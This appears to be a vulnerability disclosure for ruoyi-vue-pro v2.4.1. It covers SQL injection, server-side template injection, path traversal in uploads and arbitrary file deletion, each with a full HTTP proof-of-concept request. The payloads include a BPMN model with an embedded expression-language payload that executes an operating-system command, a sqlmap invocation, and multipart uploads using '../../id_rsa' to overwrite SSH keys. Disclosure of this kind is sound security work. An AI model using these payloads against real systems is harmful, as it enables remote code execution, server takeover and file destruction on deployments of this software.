BUG_Author

Longlong Gong

# Project

Address: [ruoyi-vue-pro](https://gitee.com/zhijiantianya/ruoyi-vue-pro)
SQL: https://github.com/uglory-gll/javasec/tree/main/SQL/ruoyi-vue-pro

## 1、SQL injection

###  `/report/go-view/data/get-by-sql` SQL injection

[Affected version]

v2.4.1



[Affected Component]

/report/go-view/data/get-by-sql



[Software]

https://gitee.com/zhijiantianya/ruoyi-vue-pro/archive/refs/tags/v2.4.1(jdk8/11).zip



[Description]

There is an SQL injection vulnerability in the SQL parameters of the `/report/go-view/data/get-by-sql ` interface in the ruoyi-vue-pro system v2.4.1. Hackers can exploit this vulnerability to obtain sensitive server information

POC

```
POST /admin-api/report/go-view/data/get-by-sql HTTP/1.1
Host: 127.0.0.1:48080
Content-Length: 18
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-mobile: ?0
Authorization: Bearer 086046e45f974777a8c524c4980d3f91
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Accept: application/json, text/plain, */*
tenant-id: 1
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1:3000
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"sql":"*"}
```

```
use sqlmap：python sqlmap.py -r poc.txt --level 3 --risk 2
```

ruoyi-vue-pro-v2.4.1(jdk8-11)\yudao-module-report\yudao-module-report-biz\src\main\java\cn\iocoder\yudao\module\report\controller\admin\goview\GoViewDataController.java

![image-20250302125945435](assets/image-20250302125945435.png)

![image-20250302130006760](assets/image-20250302130006760.png)

Report Management ->Large Screen Designer ->Projects ->My All Projects. After importing the initial SQL file, here is an SQL example. Click Preview, capture the POC written above, and directly use level 3 and risk 2 to successfully attack the sqlmap

![image-20250302125648561](assets/image-20250302125648561.png)

![image-20250302125703090](assets/image-20250302125703090.png)

![image-20250302130437650](assets/image-20250302130437650.png)

![image-20250302125733536](assets/image-20250302125733536.png)

![image-20250302125747000](assets/image-20250302125747000.png)

## 2、SSTI

###  `/admin-api/bpm/model/deploy` SSTI

[Affected version]

v2.4.1



[Affected Component]

/admin-api/bpm/model/deploy



[Software]

https://gitee.com/zhijiantianya/ruoyi-vue-pro/archive/refs/tags/v2.4.1(jdk8/11).zip



[Description]

The `/admin-api/bpm/model/deploy ` interface in ruoyi-vue-pro system v2.4.1 has an SSTI vulnerability. Hackers can exploit this vulnerability to remotely execute commands and gain server privileges

POC

First, create a process form, then create a process classification, and then create a new model. After creating the process, deploy and trigger it

```
POST /admin-api/bpm/model/create HTTP/1.1
Host: localhost:48080
Content-Length: 7071
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-mobile: ?0
Authorization: Bearer 91d67347e5804d239bd6e367ca9615ec
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Accept: application/json, text/plain, */*
tenant-id: 1
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"name":"a","key":"a","category":"111","icon":"http://test.yudao.iocoder.cn/6648604162fb9fc620c38d21c21ab205da1a360cd250edb01b241cb9bf108c76.jpg","description":"","type":10,"formType":10,"formId":33,"formCustomCreatePath":"","formCustomViewPath":"","visible":true,"startUserType":0,"startUserIds":[],"managerUserIds":[1],"allowCancelRunningProcess":true,"processIdRule":{"enable":false,"prefix":"","infix":"","postfix":"","length":5},"autoApprovalType":0,"titleSetting":{"enable":false,"title":""},"summarySetting":{"enable":false,"summary":[]},"bpmnXml":"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<bpmn2:definitions xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:bpmn2=\"http://www.omg.org/spec/BPMN/20100524/MODEL\" xmlns:bpmndi=\"http://www.omg.org/spec/BPMN/20100524/DI\" xmlns:dc=\"http://www.omg.org/spec/DD/20100524/DC\" xmlns:di=\"http://www.omg.org/spec/DD/20100524/DI\" xmlns:flowable=\"http://flowable.org/bpmn\" id=\"diagram_a\" targetNamespace=\"http://flowable.org/bpmn\"><bpmn2:process id=\"a\" name=\"1\" isExecutable=\"true\"><bpmn2:startEvent id=\"Event_1lyk5dv\"><bpmn2:timerEventDefinition><bpmn2:timeDuration>${\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\\'calc\\')')}</bpmn2:timeDuration></bpmn2:timerEventDefinition><bpmn2:outgoing>Flow_003kdhp</bpmn2:outgoing></bpmn2:startEvent><bpmn2:userTask id=\"Activity_1mqon8o\" name=\"1\" flowable:formKey=\"33\"><bpmn2:extensionElements><flowable:approveMethod>4</flowable:approveMethod><flowable:candidateStrategy>60</flowable:candidateStrategy><flowable:candidateParam>${bpmTaskAssignLeaderExpression.calculateUsers(execution, 1)}</flowable:candidateParam><flowable:formData /><flowable:assignStartUserHandlerType>1</flowable:assignStartUserHandlerType><flowable:rejectHandlerType>1</flowable:rejectHandlerType><flowable:rejectReturnTaskId /><flowable:assignEmptyHandlerType>1</flowable:assignEmptyHandlerType><flowable:assignEmptyUserIds /><flowable:approveType>1</flowable:approveType><flowable:buttonsSetting id=\"1\" enable=\"true\" displayName=\"éè¿\" /><flowable:buttonsSetting id=\"2\" enable=\"true\" displayName=\"æç»\" /><flowable:buttonsSetting id=\"3\" enable=\"true\" displayName=\"è½¬å\" /><flowable:buttonsSetting id=\"4\" enable=\"true\" displayName=\"å§æ´¾\" /><flowable:buttonsSetting id=\"5\" enable=\"true\" displayName=\"å ç­¾\" /><flowable:buttonsSetting id=\"6\" enable=\"true\" displayName=\"éå\" /><flowable:signEnable>false</flowable:signEnable><flowable:reasonRequire>false</flowable:reasonRequire></bpmn2:extensionElements><bpmn2:incoming>Flow_003kdhp</bpmn2:incoming><bpmn2:outgoing>Flow_0jz2gsv</bpmn2:outgoing><bpmn2:multiInstanceLoopCharacteristics isSequential=\"true\" flowable:collection=\"${coll_userList}\"><bpmn2:loopCardinality xsi:type=\"bpmn2:tFormalExpression\">1</bpmn2:loopCardinality><bpmn2:completionCondition xsi:type=\"bpmn2:tFormalExpression\">${ nrOfCompletedInstances &gt;= nrOfInstances }</bpmn2:completionCondition></bpmn2:multiInstanceLoopCharacteristics></bpmn2:userTask><bpmn2:sequenceFlow id=\"Flow_003kdhp\" name=\"ccccccccccc\" sourceRef=\"Event_1lyk5dv\" targetRef=\"Activity_1mqon8o\"><bpmn2:documentation></bpmn2:documentation><bpmn2:extensionElements><flowable:properties /></bpmn2:extensionElements></bpmn2:sequenceFlow><bpmn2:userTask id=\"Activity_1dm4pnb\" name=\"2\"><bpmn2:extensionElements><flowable:approveMethod>4</flowable:approveMethod><flowable:candidateStrategy>36</flowable:candidateStrategy><flowable:candidateParam /><flowable:assignStartUserHandlerType>1</flowable:assignStartUserHandlerType><flowable:rejectHandlerType>1</flowable:rejectHandlerType><flowable:rejectReturnTaskId /><flowable:assignEmptyHandlerType>1</flowable:assignEmptyHandlerType><flowable:assignEmptyUserIds /><flowable:approveType>1</flowable:approveType><flowable:buttonsSetting id=\"1\" enable=\"true\" displayName=\"éè¿\" /><flowable:buttonsSetting id=\"2\" enable=\"true\" displayName=\"æç»\" /><flowable:buttonsSetting id=\"3\" enable=\"true\" displayName=\"è½¬å\" /><flowable:buttonsSetting id=\"4\" enable=\"true\" displayName=\"å§æ´¾\" /><flowable:buttonsSetting id=\"5\" enable=\"true\" displayName=\"å ç­¾\" /><flowable:buttonsSetting id=\"6\" enable=\"true\" displayName=\"éå\" /><flowable:signEnable>false</flowable:signEnable><flowable:reasonRequire>false</flowable:reasonRequire><flowable:formData /></bpmn2:extensionElements><bpmn2:incoming>Flow_0jz2gsv</bpmn2:incoming><bpmn2:outgoing>Flow_1y4ru9j</bpmn2:outgoing><bpmn2:multiInstanceLoopCharacteristics isSequential=\"true\" flowable:collection=\"${coll_userList}\"><bpmn2:loopCardinality xsi:type=\"bpmn2:tFormalExpression\">1</bpmn2:loopCardinality><bpmn2:completionCondition xsi:type=\"bpmn2:tFormalExpression\">${ nrOfCompletedInstances &gt;= nrOfInstances }</bpmn2:completionCondition></bpmn2:multiInstanceLoopCharacteristics></bpmn2:userTask><bpmn2:sequenceFlow id=\"Flow_0jz2gsv\" sourceRef=\"Activity_1mqon8o\" targetRef=\"Activity_1dm4pnb\" /><bpmn2:endEvent id=\"Event_0esnrkb\"><bpmn2:extensionElements><flowable:executionListener expression=\"${&#34;&#34;.getClass().forName(&#34;javax.script.ScriptEngineManager&#34;).newInstance().getEngineByName(&#34;js&#34;).eval(&#39;function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\\&#39;calc\\&#39;)&#39;)}\" event=\"start\" /></bpmn2:extensionElements><bpmn2:incoming>Flow_1y4ru9j</bpmn2:incoming></bpmn2:endEvent><bpmn2:sequenceFlow id=\"Flow_1y4ru9j\" sourceRef=\"Activity_1dm4pnb\" targetRef=\"Event_0esnrkb\" /></bpmn2:process><bpmndi:BPMNDiagram id=\"BPMNDiagram_1\"><bpmndi:BPMNPlane id=\"a_di\" bpmnElement=\"a\"><bpmndi:BPMNShape id=\"Event_1lyk5dv_di\" bpmnElement=\"Event_1lyk5dv\"><dc:Bounds x=\"202\" y=\"172\" width=\"36\" height=\"36\" /></bpmndi:BPMNShape><bpmndi:BPMNShape id=\"Activity_1mqon8o_di\" bpmnElement=\"Activity_1mqon8o\"><dc:Bounds x=\"290\" y=\"150\" width=\"100\" height=\"80\" /><bpmndi:BPMNLabel /></bpmndi:BPMNShape><bpmndi:BPMNShape id=\"Activity_1dm4pnb_di\" bpmnElement=\"Activity_1dm4pnb\"><dc:Bounds x=\"450\" y=\"150\" width=\"100\" height=\"80\" /><bpmndi:BPMNLabel /></bpmndi:BPMNShape><bpmndi:BPMNShape id=\"Event_0esnrkb_di\" bpmnElement=\"Event_0esnrkb\"><dc:Bounds x=\"612\" y=\"172\" width=\"36\" height=\"36\" /></bpmndi:BPMNShape><bpmndi:BPMNEdge id=\"Flow_003kdhp_di\" bpmnElement=\"Flow_003kdhp\"><di:waypoint x=\"238\" y=\"190\" /><di:waypoint x=\"290\" y=\"190\" /><bpmndi:BPMNLabel><dc:Bounds x=\"234\" y=\"172\" width=\"61\" height=\"14\" /></bpmndi:BPMNLabel></bpmndi:BPMNEdge><bpmndi:BPMNEdge id=\"Flow_0jz2gsv_di\" bpmnElement=\"Flow_0jz2gsv\"><di:waypoint x=\"390\" y=\"190\" /><di:waypoint x=\"450\" y=\"190\" /></bpmndi:BPMNEdge><bpmndi:BPMNEdge id=\"Flow_1y4ru9j_di\" bpmnElement=\"Flow_1y4ru9j\"><di:waypoint x=\"550\" y=\"190\" /><di:waypoint x=\"612\" y=\"190\" /></bpmndi:BPMNEdge></bpmndi:BPMNPlane></bpmndi:BPMNDiagram></bpmn2:definitions>","simpleModel":null}
```

```
POST /admin-api/bpm/model/deploy?id=e8a5b6af-f7da-11ef-8453-98bd80608399 HTTP/1.1
Host: localhost:48080
Content-Length: 0
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
Accept: application/json, text/plain, */*
tenant-id: 1
sec-ch-ua-mobile: ?0
Authorization: Bearer 91d67347e5804d239bd6e367ca9615ec
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close


```

Here are the specific operations

![image-20250303110625080](assets/image-20250303110625080.png)

![image-20250303110645585](assets/image-20250303110645585.png)

![image-20250303110714291](assets/image-20250303110714291.png)

The following is the content of the XML file

```
<?xml version="1.0" encoding="UTF-8"?>
<bpmn2:definitions xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:bpmn2="http://www.omg.org/spec/BPMN/20100524/MODEL" xmlns:bpmndi="http://www.omg.org/spec/BPMN/20100524/DI" xmlns:dc="http://www.omg.org/spec/DD/20100524/DC" xmlns:di="http://www.omg.org/spec/DD/20100524/DI" xmlns:flowable="http://flowable.org/bpmn" id="diagram_a" targetNamespace="http://flowable.org/bpmn"><bpmn2:process id="a" name="1" isExecutable="true"><bpmn2:startEvent id="Event_1lyk5dv"><bpmn2:timerEventDefinition><bpmn2:timeDuration>${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\')')}</bpmn2:timeDuration></bpmn2:timerEventDefinition><bpmn2:outgoing>Flow_003kdhp</bpmn2:outgoing></bpmn2:startEvent><bpmn2:userTask id="Activity_1mqon8o" name="1" flowable:formKey="33"><bpmn2:extensionElements><flowable:approveMethod>4</flowable:approveMethod><flowable:candidateStrategy>60</flowable:candidateStrategy><flowable:candidateParam>${bpmTaskAssignLeaderExpression.calculateUsers(execution, 1)}</flowable:candidateParam><flowable:formData /><flowable:assignStartUserHandlerType>1</flowable:assignStartUserHandlerType><flowable:rejectHandlerType>1</flowable:rejectHandlerType><flowable:rejectReturnTaskId /><flowable:assignEmptyHandlerType>1</flowable:assignEmptyHandlerType><flowable:assignEmptyUserIds /><flowable:approveType>1</flowable:approveType><flowable:buttonsSetting id="1" enable="true" displayName="通过" /><flowable:buttonsSetting id="2" enable="true" displayName="拒绝" /><flowable:buttonsSetting id="3" enable="true" displayName="转办" /><flowable:buttonsSetting id="4" enable="true" displayName="委派" /><flowable:buttonsSetting id="5" enable="true" displayName="加签" /><flowable:buttonsSetting id="6" enable="true" displayName="退回" /><flowable:signEnable>false</flowable:signEnable><flowable:reasonRequire>false</flowable:reasonRequire></bpmn2:extensionElements><bpmn2:incoming>Flow_003kdhp</bpmn2:incoming><bpmn2:outgoing>Flow_0jz2gsv</bpmn2:outgoing><bpmn2:multiInstanceLoopCharacteristics isSequential="true" flowable:collection="${coll_userList}"><bpmn2:loopCardinality xsi:type="bpmn2:tFormalExpression">1</bpmn2:loopCardinality><bpmn2:completionCondition xsi:type="bpmn2:tFormalExpression">${ nrOfCompletedInstances &gt;= nrOfInstances }</bpmn2:completionCondition></bpmn2:multiInstanceLoopCharacteristics></bpmn2:userTask><bpmn2:sequenceFlow id="Flow_003kdhp" name="ccccccccccc" sourceRef="Event_1lyk5dv" targetRef="Activity_1mqon8o"><bpmn2:documentation></bpmn2:documentation><bpmn2:extensionElements><flowable:properties /></bpmn2:extensionElements></bpmn2:sequenceFlow><bpmn2:userTask id="Activity_1dm4pnb" name="2"><bpmn2:extensionElements><flowable:approveMethod>4</flowable:approveMethod><flowable:candidateStrategy>36</flowable:candidateStrategy><flowable:candidateParam /><flowable:assignStartUserHandlerType>1</flowable:assignStartUserHandlerType><flowable:rejectHandlerType>1</flowable:rejectHandlerType><flowable:rejectReturnTaskId /><flowable:assignEmptyHandlerType>1</flowable:assignEmptyHandlerType><flowable:assignEmptyUserIds /><flowable:approveType>1</flowable:approveType><flowable:buttonsSetting id="1" enable="true" displayName="通过" /><flowable:buttonsSetting id="2" enable="true" displayName="拒绝" /><flowable:buttonsSetting id="3" enable="true" displayName="转办" /><flowable:buttonsSetting id="4" enable="true" displayName="委派" /><flowable:buttonsSetting id="5" enable="true" displayName="加签" /><flowable:buttonsSetting id="6" enable="true" displayName="退回" /><flowable:signEnable>false</flowable:signEnable><flowable:reasonRequire>false</flowable:reasonRequire><flowable:formData /></bpmn2:extensionElements><bpmn2:incoming>Flow_0jz2gsv</bpmn2:incoming><bpmn2:outgoing>Flow_1y4ru9j</bpmn2:outgoing><bpmn2:multiInstanceLoopCharacteristics isSequential="true" flowable:collection="${coll_userList}"><bpmn2:loopCardinality xsi:type="bpmn2:tFormalExpression">1</bpmn2:loopCardinality><bpmn2:completionCondition xsi:type="bpmn2:tFormalExpression">${ nrOfCompletedInstances &gt;= nrOfInstances }</bpmn2:completionCondition></bpmn2:multiInstanceLoopCharacteristics></bpmn2:userTask><bpmn2:sequenceFlow id="Flow_0jz2gsv" sourceRef="Activity_1mqon8o" targetRef="Activity_1dm4pnb" /><bpmn2:endEvent id="Event_0esnrkb"><bpmn2:extensionElements><flowable:executionListener expression="${&#34;&#34;.getClass().forName(&#34;javax.script.ScriptEngineManager&#34;).newInstance().getEngineByName(&#34;js&#34;).eval(&#39;function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\&#39;calc\&#39;)&#39;)}" event="start" /></bpmn2:extensionElements><bpmn2:incoming>Flow_1y4ru9j</bpmn2:incoming></bpmn2:endEvent><bpmn2:sequenceFlow id="Flow_1y4ru9j" sourceRef="Activity_1dm4pnb" targetRef="Event_0esnrkb" /></bpmn2:process><bpmndi:BPMNDiagram id="BPMNDiagram_1"><bpmndi:BPMNPlane id="a_di" bpmnElement="a"><bpmndi:BPMNShape id="Event_1lyk5dv_di" bpmnElement="Event_1lyk5dv"><dc:Bounds x="202" y="172" width="36" height="36" /></bpmndi:BPMNShape><bpmndi:BPMNShape id="Activity_1mqon8o_di" bpmnElement="Activity_1mqon8o"><dc:Bounds x="290" y="150" width="100" height="80" /><bpmndi:BPMNLabel /></bpmndi:BPMNShape><bpmndi:BPMNShape id="Activity_1dm4pnb_di" bpmnElement="Activity_1dm4pnb"><dc:Bounds x="450" y="150" width="100" height="80" /><bpmndi:BPMNLabel /></bpmndi:BPMNShape><bpmndi:BPMNShape id="Event_0esnrkb_di" bpmnElement="Event_0esnrkb"><dc:Bounds x="612" y="172" width="36" height="36" /></bpmndi:BPMNShape><bpmndi:BPMNEdge id="Flow_003kdhp_di" bpmnElement="Flow_003kdhp"><di:waypoint x="238" y="190" /><di:waypoint x="290" y="190" /><bpmndi:BPMNLabel><dc:Bounds x="234" y="172" width="61" height="14" /></bpmndi:BPMNLabel></bpmndi:BPMNEdge><bpmndi:BPMNEdge id="Flow_0jz2gsv_di" bpmnElement="Flow_0jz2gsv"><di:waypoint x="390" y="190" /><di:waypoint x="450" y="190" /></bpmndi:BPMNEdge><bpmndi:BPMNEdge id="Flow_1y4ru9j_di" bpmnElement="Flow_1y4ru9j"><di:waypoint x="550" y="190" /><di:waypoint x="612" y="190" /></bpmndi:BPMNEdge></bpmndi:BPMNPlane></bpmndi:BPMNDiagram></bpmn2:definitions>
```

Then save and publish，We are using JDK8 here

![image-20250303110948950](assets/image-20250303110948950.png)

Below is the code section

ruoyi-vue-pro-v2.4.1(jdk8-11)\yudao-module-bpm\yudao-module-bpm-biz\src\main\java\cn\iocoder\yudao\module\bpm\controller\admin\definition\BpmModelController.java

![image-20250303111146148](assets/image-20250303111146148.png)



![image-20250303111340418](assets/image-20250303111340418.png)

![image-20250303111323538](assets/image-20250303111323538.png)

![image-20250303111905282](assets/image-20250303111905282.png)

## 3、File Path Traversal Front-end

###  `/app-api/infra/file/upload` File Path Traversal

[Affected version]

v2.4.1



[Affected Component]

/app-api/infra/file/upload



[Software]

https://gitee.com/zhijiantianya/ruoyi-vue-pro/archive/refs/tags/v2.4.1(jdk17/21).zip



[Description]

There is a directory traversal vulnerability in the front-end store interface of Ruoyi-Vue-Pro v2.4.1, specifically in the `/app-api/infra/file/upload`. Hackers can exploit this vulnerability to upload any file to any directory on the server. If it is a Linux server, the SSH private key may be replaced, resulting in the loss of server privileges.

POC

```
POST /app-api/infra/file/upload HTTP/1.1
Host: 127.0.0.1:48080
Content-Length: 297
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDTWde2L7596MQhu6
tenant-id: 1
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:3000
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:3000/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryDTWde2L7596MQhu6
Content-Disposition: form-data; name="file"; filename="111.txt"
Content-Type: image/jpeg

flag{ssh-key}
------WebKitFormBoundaryDTWde2L7596MQhu6
Content-Disposition: form-data; name="path"

../../id_rsa
------WebKitFormBoundaryDTWde2L7596MQhu6--

```

We can first see that there is no id_rsa file in the root directory here

![image-20250309141642375](assets/image-20250309141642375.png)

We go to Infrastructure ->File Management ->File Configuration

![image-20250309141737911](assets/image-20250309141737911.png)

Add a local disk storage and set it as the primary configuration

![image-20250309141834365](assets/image-20250309141834365.png)

![image-20250309141902567](assets/image-20250309141902567.png)

Open the front-end mall project

![image-20250309141958263](assets/image-20250309141958263.png)

First, log in. Enter any phone number here to send the verification code. Enter the verification code 9999 to successfully log in

![image-20250309142049397](assets/image-20250309142049397.png)

![image-20250309142140927](assets/image-20250309142140927.png)

Click on the avatar and click on 'modify'

![image-20250309142200051](assets/image-20250309142200051.png)

![image-20250309142225743](assets/image-20250309142225743.png)

Here, file upload can add a field 'path', which causes directory traversal

![image-20250309142307125](assets/image-20250309142307125.png)

Follow the code below to see the principle

yudao\ruoyi-vue-pro-v2.4.1(jdk17-21)\yudao-module-infra\yudao-module-infra-biz\src\main\java\cn\iocoder\yudao\module\infra\controller\app\file\AppFileController.java

![image-20250309144833562](assets/image-20250309144833562.png)

![image-20250309142355589](assets/image-20250309142355589.png)

![image-20250309142436449](assets/image-20250309142436449.png)

Upload successful here

![image-20250309142457102](assets/image-20250309142457102.png)

You can see the results here. If there is a situation where JSP parsing occurs on a Linux server or other web projects deployed on this disk, it may cause the server to crash

![image-20250309142524116](assets/image-20250309142524116.png)

## 4、File Path Traversal Back-end

###  `/admin-api/infra/file/upload` File Path Traversal

[Affected version]

v2.4.1



[Affected Component]

/admin-api/infra/file/upload



[Software]

https://gitee.com/zhijiantianya/ruoyi-vue-pro/archive/refs/tags/v2.4.1(jdk17/21).zip



[Description]

There is a directory traversal vulnerability in the backend file upload interface of ruoyi-vue-pro v2.4.1, specifically in the `/admin-api/infra/file/upload` section. Hackers can exploit this vulnerability to upload any file to any directory on the server. If it is a Linux server, the SSH private key may be replaced, resulting in the loss of server privileges.

POC

```
POST /admin-api/infra/file/upload HTTP/1.1
Host: localhost:48080
Content-Length: 297
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-mobile: ?0
Authorization: Bearer 8b1569dd6967411ab76b02ea8677de28
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryllisARk9GtqriRXO
Accept: application/json, text/plain, */*
tenant-id: 1
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryllisARk9GtqriRXO
Content-Disposition: form-data; name="file"; filename="111.jpg"
Content-Type: image/jpeg

flag{ssh-key}
------WebKitFormBoundaryllisARk9GtqriRXO
Content-Disposition: form-data; name="path"

../../id_rsa
------WebKitFormBoundaryllisARk9GtqriRXO--

```

We can see on drive E that there are no files we want to upload inside

![image-20250309144355859](assets/image-20250309144355859.png)

We first configure the upload location to be local, Infrastructure ->File Management ->File Configuration

![image-20250309144522098](assets/image-20250309144522098.png)

Set as primary configuration

![image-20250309144539914](assets/image-20250309144539914.png)

Go to Infrastructure ->File Management ->File List, upload an image file

![image-20250309144619561](assets/image-20250309144619561.png)

Send upload interface to repeat interface

![image-20250309144714942](assets/image-20250309144714942.png)

Let's come to the code to see the principle

yudao\ruoyi-vue-pro-v2.4.1(jdk17-21)\yudao-module-infra\yudao-module-infra-biz\src\main\java\cn\iocoder\yudao\module\infra\controller\admin\file\FileController.java

![image-20250309144748239](assets/image-20250309144748239.png)

When we add a path field, we will take our path and concatenate it

![image-20250309145008296](assets/image-20250309145008296.png)

We can see that the directory traversal was successful

![image-20250309145036314](assets/image-20250309145036314.png)

![image-20250309145047279](assets/image-20250309145047279.png)

Successfully added a file with the content 'flag {ssh key}' to the root directory of drive E. Uploading ssh-ras on a Linux system may result in server permissions being compromised

![image-20250309145107163](assets/image-20250309145107163.png)

![image-20250309145129470](assets/image-20250309145129470.png)

## 5、Arbitrary file deletion vulnerability --uploadPermanentMaterial

###  `/admin-api/mp/material/upload-permanent` Arbitrary file deletion

[Affected version]

v2.4.1



[Affected Component]

/admin-api/mp/material/upload-permanent



[Software]

https://gitee.com/zhijiantianya/ruoyi-vue-pro/archive/refs/tags/v2.4.1(jdk17/21).zip



[Description]

There is an arbitrary file deletion vulnerability caused by directory traversal in the material upload interface of ruoyi-vue-pro v2.4.1, as described in the `/admin-api/mp/material/upload-permanent` section. Hackers can exploit this vulnerability to delete files that can be accessed by the programme.

POC

```
POST /admin-api/mp/material/upload-permanent HTTP/1.1
Host: localhost:48080
Content-Length: 590
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqftzAbuQicoafHGL
sec-ch-ua-mobile: ?0
Authorization: Bearer ca9592f592794ffdb722eb439f2156b8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
sec-ch-ua-platform: "Windows"
Accept: */*
Origin: http://localhost
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryqftzAbuQicoafHGL
Content-Disposition: form-data; name="type"

image
------WebKitFormBoundaryqftzAbuQicoafHGL
Content-Disposition: form-data; name="title"


------WebKitFormBoundaryqftzAbuQicoafHGL
Content-Disposition: form-data; name="introduction"


------WebKitFormBoundaryqftzAbuQicoafHGL
Content-Disposition: form-data; name="accountId"

6
------WebKitFormBoundaryqftzAbuQicoafHGL
Content-Disposition: form-data; name="file"; filename="../../flag.txt"
Content-Type: image/jpeg

test
------WebKitFormBoundaryqftzAbuQicoafHGL--

```

This needs to be a file that the program has permission to access. We can create a test file in the AppSata directory

![image-20250313084612184](assets/image-20250313084612184.png)

Go to official account management ->account management ->add a test account, where the appId format should be correct, such as: wx1111111111111111

![image-20250313085222777](assets/image-20250313085222777.png)

Go to official account management ->material management and upload files

![image-20250313085302681](assets/image-20250313085302681.png)

Here filename can traverse directories

![image-20250313085329511](assets/image-20250313085329511.png)

Finally, this temporary file will be deleted. We can delete other files by directory traversal

![image-20250313085416806](assets/image-20250313085416806.png)

![image-20250313085436498](assets/image-20250313085436498.png)

## 6、Arbitrary file deletion vulnerability --uploadTemporaryMaterial

###  `/admin-api/mp/material/upload-temporary` Arbitrary file deletion

[Affected version]

v2.4.1



[Affected Component]

/admin-api/mp/material/upload-temporary



[Software]

https://gitee.com/zhijiantianya/ruoyi-vue-pro/archive/refs/tags/v2.4.1(jdk17/21).zip



[Description]

There is an arbitrary file deletion vulnerability caused by directory traversal in the material upload interface of ruoyi-vue-pro v2.4.1, as described in the `/admin-api/mp/material/upload-temporary` section. Hackers can exploit this vulnerability to delete files that can be accessed by the programme.

POC

```
POST /admin-api/mp/material/upload-temporary HTTP/1.1
Host: localhost:48080
Content-Length: 4083
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAqb1bgnFWCYHVAUE
sec-ch-ua-mobile: ?0
Authorization: Bearer cd37d92191e34709a7bf43646831ca22
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
sec-ch-ua-platform: "Windows"
Accept: */*
Origin: http://localhost
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryAqb1bgnFWCYHVAUE
Content-Disposition: form-data; name="accountId"

6
------WebKitFormBoundaryAqb1bgnFWCYHVAUE
Content-Disposition: form-data; name="type"

image
------WebKitFormBoundaryAqb1bgnFWCYHVAUE
Content-Disposition: form-data; name="title"


------WebKitFormBoundaryAqb1bgnFWCYHVAUE
Content-Disposition: form-data; name="introduction"


------WebKitFormBoundaryAqb1bgnFWCYHVAUE
Content-Disposition: form-data; name="file"; filename="../../test.txt"
Content-Type: image/jpeg

test
------WebKitFormBoundaryAqb1bgnFWCYHVAUE--

```

This is a temporary material upload interface. We will first create a test file under appdata, and the Java program has permission to access it

![image-20250313090606103](assets/image-20250313090606103.png)

Go to official account management and add an account. The appid must conform to the format, such as wx1111111111111111

